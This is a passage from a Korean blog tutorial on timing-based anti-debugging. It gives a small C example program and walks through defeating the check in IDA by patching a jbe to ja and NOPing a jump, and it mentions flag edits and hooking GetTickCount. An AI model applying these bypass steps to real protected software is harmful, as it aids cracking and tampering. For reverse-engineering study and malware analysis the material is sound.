&#xAC04;&#xB2E8;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Important data processed successfully!\n&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;nztfdsfulfz&quot;</span>;    <span class="hljs-comment">// [1] &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;: &#xD568;&#xC218; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC744; &#xCE21;&#xC815;&#xD558;&#xC5EC; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xAE34; &#xC2DC;&#xAC04; &#xC18C;&#xC694; &#xC2DC; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xBD99;&#xC5C8;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;</span>    <span class="hljs-keyword">uint64_t</span> start_time = GetTickCount64();    decryptKey(key);    <span class="hljs-keyword">uint64_t</span> end_time = GetTickCount64();    <span class="hljs-keyword">uint64_t</span> elapsed_time = end_time - start_time;    <span class="hljs-comment">// [2] 1&#xCD08; &#xC774;&#xC0C1; &#xAC78;&#xB9AC;&#xBA74; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xBD99;&#xC5C8;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;</span>    <span class="hljs-keyword">if</span> (elapsed_time &gt; <span class="hljs-number">1000</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// &#xCF54;&#xB4DC; &#xC885;&#xB8CC;</span>    }    <span class="hljs-comment">// [3] &#xD0A4;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xB85C;&#xC9C1; &#xC2E4;&#xD589;: &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xC640; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xC815;&#xC0C1; &#xB3D9;&#xC791; &#xC5EC;&#xBD80; &#xD310;&#xB2E8;</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(key, <span class="hljs-string">&quot;mysecretkey&quot;</span>) == <span class="hljs-number">0</span>) {        processImportantData(key);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid key!\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC911;&#xC694;&#xD55C; &#xB85C;&#xC9C1;, &#xC989; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xBCF4;&#xD638;&#xD569;&#xB2C8;&#xB2E4;([1]).  &#xB9CC;&#xC57D; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC758; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; ([2]) &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C;, &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; ([3]) &#xB85C;&#xC9C1;&#xC774; &#xBB38;&#xC81C;&#xC5C6;&#xC774; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xC774; &#xC798;&#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; <code>Important data processed successfully!</code> &#xAC00; &#xCD9C;&#xB825;&#xC774; &#xB418;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xB85C;&#xC9C1;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB124; &#xC774;&#xC81C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD588;&#xC73C;&#xB2C8;&#xAE4C; IDA&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB300;&#xD574; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xB3C4;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%2011.png" alt="image.png"></p><p>&#xC544;&#xBB34;&#xB798;&#xB3C4; &#xC800;&#xD76C;&#xAC00; &#xAD81;&#xAE08;&#xD55C;&#xAC74; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC774;&#xB2C8; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB294; &#xD568;&#xC218;&#xC5D0; Break Point(&#xB2E8;&#xCD95;&#xD0A4;: F2)&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xB514;&#xBC84;&#xAE45;(F9)&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. Step Into(F7)&#xB85C; &#xD574;&#xB2F9; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xB85C;&#xC9C1;&#xC744; &#xBCF8; &#xD6C4; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCF5;&#xD638;&#xD654;&#xB418;&#xB294;&#xC9C0; &#xD30C;&#xC545; &#xD6C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xACC4;&#xC18D; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xBCF4;&#xBA74;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xD0D0;&#xC9C0;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xB728;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="2f9db531-4021-4c69-9805-b40c8cb60ee0.png" alt="image.png"></p><p>&#xBE44;&#xB85D; &#xC9C0;&#xAE08;&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xC608;&#xC81C;&#xC77C;&#xC9C0;&#xB77C;&#xB3C4;, &#xC2E4;&#xD589;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xAC12;&#xC774; &#xBCC0;&#xACBD;&#xB41C;&#xB2E4;&#xBA74; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xAC12;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xAC15;&#xC81C; &#xC885;&#xB8CC;&#xB418;&#xC5B4; &#xADF8; &#xAC12;&#xC744; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xAE30;&#xC220; &#xC219;&#xB828;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xBCF4;&#xD638; &#xC218;&#xC900;&#xC774; &#xD06C;&#xAC8C; &#xB2EC;&#xB77C;&#xC9C0;&#xBBC0;&#xB85C;, &#xACE0;&#xB3C4;&#xC758; &#xAE30;&#xC220;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xBA74; &#xBD84;&#xC11D;&#xC744; &#xB354;&#xC6B1; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xD328;&#xCE58;-Bypass-Dynamic-Anti-Debugging"><a href="#2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xD328;&#xCE58;-Bypass-Dynamic-Anti-Debugging" class="headerlink" title="2. &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD328;&#xCE58; (Bypass Dynamic Anti-Debugging)"></a>2. &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD328;&#xCE58; (Bypass Dynamic Anti-Debugging)</h3><p>&#xC704; &#xCF54;&#xB4DC;&#xC758; &#xD750;&#xB984;&#xC0C1; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC744; &#xD328;&#xCE58;&#xD558;&#xBA74; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? </p><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 2&#xAC1C;&#xC758; &#xACBD;&#xC6B0;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xACA0;&#xC8E0;?</p><blockquote><p><strong>&#x2460; &#xD0C0;&#xC774;&#xBC0D; &#xCCB4;&#xD06C;&#xB97C; &#xBB34;&#xB825;&#xD654;</strong></p><ol><li><code>GetTickCount64()</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xD328;&#xCE58;<ol><li>NOP&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD558;&#xAC70;&#xB098; &#xD2B9;&#xC815;&#xD55C; &#xC0C1;&#xC218;&#xAC12;&#xC744; &#xBC18;&#xD658;&#xD558;&#xB294; &#xD568;&#xC218;&#xB85C; &#xD328;&#xCE58; &#xB4F1;</li></ol></li><li><code>if (elapsed_time &gt; 1000)</code> &#xBD80;&#xBD84;&#xC744; <code>if (elapsed_time &lt; 0)</code> &#xAC19;&#xC740; <strong>&#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xC870;&#xAC74;</strong>&#xC73C;&#xB85C; &#xBCC0;&#xACBD;<ul><li>&#xB610;&#xB294; <code>jmp</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD56D;&#xC0C1; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xC218;&#xC815;</li></ul></li></ol><p><strong>&#x2461; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC885;&#xB8CC; &#xBC29;&#xC9C0;</strong></p><p><code>printf(&quot;Debugger detected!\n&quot;); return 1;</code> &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xC11C; <code>return 1;</code>&#xC744; <strong>NOP(0x90)&#xB85C; &#xD328;&#xCE58;</strong></p></blockquote><p>&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0; &#xB530;&#xB77C; &#xBD84;&#xAE30;&#xBB38;&#xC774; &#xC2E4;&#xC81C;&#xC640; &#xB2EC;&#xB77C;&#xC9C8; &#xC218; &#xC788;&#xC73C;&#xB2C8;&#xAE4C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC0C1; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB294;&#xC9C0; IDA&#xB97C; &#xD1B5;&#xD574; &#xD55C;&#xBC88; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%2012.png" alt="image.png"></p><p>&#xC800;&#xB294; &#xC5EC;&#xAE30;&#xC11C; 16&#xBC88;&#xC9F8; &#xC904;&#xC744; &#xD328;&#xCE58;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xC0C1;&#xC73C;&#xB85C;&#xB294; 0x00271E8E&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC778;&#xB370;&#xC694;. &#xC5EC;&#xAE30;&#xC11C; CF&#xC640; ZF&#xAC00; 0&#xC774;&#xBA74;, &#xC989; <code>elapsed_time</code>&#xC774; 1&#xCD08;&#xBCF4;&#xB2E4; &#xC9E7;&#xC544;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC800;&#xB294; jbe&#xB97C; ja&#xB85C; &#xD328;&#xCE58;&#xD574;&#xC11C; 1&#xCD08;&#xBCF4;&#xB2E4; &#xAE38;&#xB54C;&#xB9CC; &#xD0A4;&#xB97C; &#xBCF4;&#xB294; &#xB85C;&#xC9C1;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. 16&#xBC88;&#xC9F8; &#xC904;&#xC744; &#xB204;&#xB978; &#xD6C4; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; 2&#xAC1C;&#xC758; jump &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB;&#xBC88;&#xC9F8; &#xBA85;&#xB839;&#xC5B4;&#xB294; NOP&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xD558;&#xACE0; &#xB450;&#xBC88;&#xC9F8; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; ja&#xB85C; &#xD328;&#xCE58;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2013.png" alt="image.png"></p><p>&#xB124; &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC544;&#xAE4C;&#xCC98;&#xB7FC; &#xD0A4; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xC5D0; Break Point&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xB514;&#xBC84;&#xAE45; &#xC2DC;&#xAC04;&#xC744; 1&#xCD08;&#xB97C; &#xB118;&#xAE34; &#xD6C4; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>F9&#xB97C; &#xB20C;&#xB7EC; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xBA74;</p><p><img src="image%2014.png" alt="image.png"></p><p>&#xCC98;&#xC74C;&#xC5D0; &#xC124;&#xC815;&#xD588;&#xB358; Break Point&#xB97C; &#xD1B5;&#xD574;&#xC11C; <code>decryptKey</code> &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xBD84;&#xC11D;&#xC744; &#xB05D;&#xB0B8; &#xD6C4; &#xACC4;&#xC18D; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC774;&#xC5B4;&#xAC00;&#xBA74; 2&#xBC88;&#xC9F8; BP&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%2015.png" alt="image.png"></p><p>2&#xBC88;&#xC9F8; BP&#xB97C; &#xB9CC;&#xB098;&#xBA74; &#x201C;Edit&gt;Patch Program&gt;Assemble&#x201C; &#xC744; &#xD1B5;&#xD574; jbe&#xB97C; ja&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD568;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p><img src="image%2016.png" alt="image.png"></p><p>&#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xC774;&#xBC88; &#xC2E4;&#xC2B5;&#xACFC; &#xAC19;&#xC740; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB294; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; <code>CF</code>, <code>ZF</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC218;&#xC815;&#xD55C;&#xB2E4;&#xAC70;&#xB098; GetTickCount() &#xD568;&#xC218;&#xB97C; &#xD6C4;&#xD0B9;&#xD574;&#xC11C; &#xC0C1;&#xC218;&#xAC12;&#xB9CC;&#xC744; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xD55C;&#xB2E4;&#xB294; &#xB4F1;&#xC73C;&#xB85C;&#xB3C4; &#xCDA9;&#xBD84;&#xD788; &#xB514;&#xBC84;&#xAC70; &#xAC80;&#xC0AC; &#xB85C;&#xC9C1;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p><img src="Debug_part2.jpg" alt="Debug_part2.jpg"></p><p>&#xC624;&#xB298; &#xC2E4;&#xC2B5;&#xD55C; &#xAE30;&#xBC95;&#xC740; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xC6B0;&#xD68C;&#xB97C; &#xC704;&#xD55C; &#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xB4E4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xBC95;&#xC740; &#x201C;&#xD568;&#xC815;&#xCE74;&#xB4DC;&#x201D;&#xCC98;&#xB7FC; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC774; &#xD2B9;&#xC815; &#xB3D9;&#xC791;&#xC744; &#xB9C9;&#xC73C;&#xB824; &#xD560; &#xB54C; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p>Debugger&#xB97C; &#xB9C9;&#xB294; Anti-Debugging &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294;&#xAC78; &#xB9C9;&#xB294; Anti-Anti-Debugging <del>&#xAE30;&#xBC95;&#xC744; &#xB9C9;&#xB294; Anti-Anti-Anti-Debugging &#xC744; &#xB9C9;&#xB294; Anti-Anti-Anti-Anti tititi &#xD504;&#xB808;&#xC9C8;&#xD504;&#xB808;&#xC9C8;</del></p><p><img src="Anti-Fragile.gif" alt="~~&#xC548;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD504;&#xB798;&#xC9C8;&#xD504;&#xB798;&#xC9C8;~~"></p><p><del>&#xC548;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD504;&#xB798;&#xC9C8;&#xD504;&#xB798;&#xC9C8;</del></p></blockquote><h2 id="&#xC548;&#xD2F0;-&#xB514;&#xBC84;&#xAE45;&#xC758;-&#xD55C;&#xACC4;"><a href="#&#xC548;&#xD2F0;-&#xB514;&#xBC84;&#xAE45;&#xC758;-&#xD55C;&#xACC4;" class="headerlink" title="&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xD55C;&#xACC4;"></a>&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xD55C;&#xACC4;</h2><p>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC5ED;&#xACF5;&#xD559;&#xACFC; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xB294; &#xD575;&#xC2EC; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xBB34;&#xB2E8; &#xBCF5;&#xC81C;, &#xD06C;&#xB799;, &#xC545;&#xC6A9;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xD2B9;&#xD788; &#xAE08;&#xC735;&#xB7;&#xAC8C;&#xC784;&#xB7;&#xBCF4;&#xC548; &#xC81C;&#xD488; &#xB4F1; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2E4;&#xB8E8;&#xB294; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xD544;&#xC218;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. (CTF&#xC5D0;&#xC11C;&#xB3C4; &#xC885;&#xC885; &#xCD9C;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;!) &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xCDB0; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xC5F0;&#xC131;&#xACFC; &#xD568;&#xAED8;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xB3C4;&#xD560; &#xB54C; &#xC774;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xACE0; &#xB300;&#xC751;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xB192;&#xC740; &#xC2E4;&#xD6A8;&#xC131;&#xC744; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC800;&#xD76C;&#xAC00; &#xC624;&#xB298; &#xD55C; &#xC2E4;&#xC2B5;&#xC5D0;&#xC11C; &#xBCF4;&#xC168;&#xB4EF;&#xC774; &#xCF54;&#xB4DC;&#xD328;&#xCE58;&#xB098; API &#xD6C4;&#xD0B9; &#xB4F1;&#xC5D0; &#xCDE8;&#xC57D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC54C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD328;&#xCE58;&#xAC00; &#xAC00;&#xB2A5;&#xD55C;&#xAC74;&#xB370;&#xC694;. </p><p><img src="image%2017.png" alt="image.png"></p><blockquote><p>???: &#xADF8;&#xB7FC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB974;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xB0D0;! / 000: &#xC5B4;&#xB5BB;&#xAC8C;!!</p></blockquote><p><img src="9o6emu.gif" alt="9o6emu.gif"></p><p>&#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xD1B5;&#xD574; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;&#xC744; &#xC54C; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;&#xC744; &#xC54C; &#xC218; &#xC5C6;&#xC73C;&#xBA74; &#xC5B4;&#xB5A4; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xC9C0; &#xBAB0;&#xB77C;&#xC11C; &#xC6B0;&#xD68C;&#xBC29;&#xBC95;&#xC744; &#xC54C;&#xAE30;&#xAC00; &#xB354;&#xB354;&#xC6B1; &#xD798;&#xB4E0;&#xB370;&#xC694;. &#xC774;&#xB7EC;&#xD55C; Anti-Reversing &#xAE30;&#xC220;&#xC740; &#xC815;&#xC801;&#xC778; &#xAE30;&#xBC95;&#xC778; &#xB09C;&#xB3C5;&#xD654;&#xC640; &#xB3D9;&#xC801;&#xC778; &#xAE30;&#xBC95;&#xC778; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xACB0;&#xD569;&#xB418;&#xC5B4;&#xC11C; &#xC4F0;&#xC774;&#xBA74; &#xBD84;&#xC11D;&#xAC00;&#xAC00; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xC5D0; &#xC0C1;&#xB2F9;&#xD788; &#xC5B4;&#xB835;&#xACE0; &#xBCF5;&#xC7A1;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC644;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. (&#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xB09C;&#xB3C5;&#xD654;&#xB3C4; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!)</p><h2 id="&#xC758;&#xC758;"><a href="#&#xC758;&#xC758;" class="headerlink" title="&#xC758;&#xC758;"></a>&#xC758;&#xC758;</h2><p>&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1;&#xC740; &#xB9C8;&#xCE58; &#xCC3D;&#xACFC; &#xBC29;&#xD328;&#xC758; &#xC2F8;&#xC6C0;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xB294; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xC791;&#xB3D9; &#xBC29;&#xC2DD;&#xC744; &#xD30C;&#xC545;&#xD558;&#xACE0;, &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xBE44;&#xBC00;&#xC744; &#xC228;&#xAE30;&#xB824; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC120;&#xB7C9;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC790; &#xAD00;&#xC810;&#xC5D0;&#xC11C;&#xB3C4; &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1;&#xC740; &#xC911;&#xC694;&#xD55C; &#xC758;&#xBBF8;&#xB97C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; 